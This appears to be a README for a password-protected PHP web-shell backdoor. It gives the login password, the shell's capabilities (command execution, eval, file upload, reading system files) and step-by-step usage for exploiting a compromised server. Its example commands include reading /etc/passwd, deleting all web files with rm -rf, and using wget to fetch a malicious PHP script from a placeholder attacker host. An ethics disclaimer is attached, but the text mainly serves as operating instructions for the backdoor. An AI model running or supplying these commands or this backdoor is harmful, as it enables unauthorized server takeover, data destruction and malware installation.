### PHP RootKit Backdoor – Features & Security Risks

## Password:
```bash
R00t
```

#### Overview

This PHP backdoor script provides full control over a web server once deployed. **It is a malicious tool** that allows unauthorized access and remote command execution.

#### Features & Functions:

- **Password-Protected Access:** Requires a predefined password for login.
- **File Manager:** View, create, edit, and delete files.
- **Command Execution:** Run system commands using `shell_exec()`.
- **PHP Code Execution:** Execute arbitrary PHP scripts via `eval()`.
- **File Upload:** Upload files to the server.
- **Sensitive File Access:** Read system files like `/etc/passwd`.

#### Usage (Theoretical)

Once uploaded to a server, this script can be accessed via a browser:

1. Navigate to the script URL.
2. Enter the password to gain access.
3. Execute commands, manage files, and exploit the server.

#### Example Commands:

```bash
ls -la  # List directory contents
cat /etc/passwd  # View system user accounts
rm -rf /var/www/html/*  # Delete all web files (dangerous)
wget http://malicious.com/malware.php -O /tmp/m.php  # Download a malicious script
php -r "system('whoami');"  # Check user permissions
```

#### Warning & Ethical Considerations

**Using such scripts for unauthorized access is illegal.** Ethical hackers and security researchers analyze these abilities to strengthen web security. If found on a system, **remove it immediately** and implement stronger security measures.
